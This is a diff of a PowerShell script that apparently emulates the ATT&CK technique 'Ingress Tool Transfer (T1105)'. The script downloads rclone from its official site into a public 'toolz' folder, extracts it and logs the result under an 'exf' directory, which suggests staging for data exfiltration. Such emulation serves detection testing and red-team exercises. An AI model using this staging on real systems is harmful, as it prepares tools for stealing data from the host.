@@ -6,7 +6,7 @@ Write-Output "Command and Control : Ingress Tool Transfer (T1105)"
 Write-Output "==============================================================================="
 #
 $ArchiveFile = "rclone-current-windows-amd64.zip"
-$DestinationDirectory = "$env:PUBLIC\toolz\rclone.exe"
+$DestinationDirectory = "$env:PUBLIC\toolz"
 $Full_Destination = "$DestinationDirectory"+"\"+"$ArchiveFile"
 $LogFile = "$env:PUBLIC\exf\rclone_down_extract.txt"; 
 $DownloadURL = "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
@@ -30,9 +30,9 @@ try {
                 [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetPath, $true)
                 Write-Output "The file [$entry] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
             }
-#        $zip.Dispose()
+        $zip.Dispose()
 #        [System.IO.Compression.ZipFile]::ExtractToDirectory("$Full_Destination", "$DestinationDirectory");
-        Write-Output "The file [$ArchiveFile] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
+#        Write-Output "The file [$ArchiveFile] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
         Get-ChildItem -Path $DestinationDirectory | Out-File -FilePath $LogFile -Encoding utf8 -Append
         exit 0;
     } 
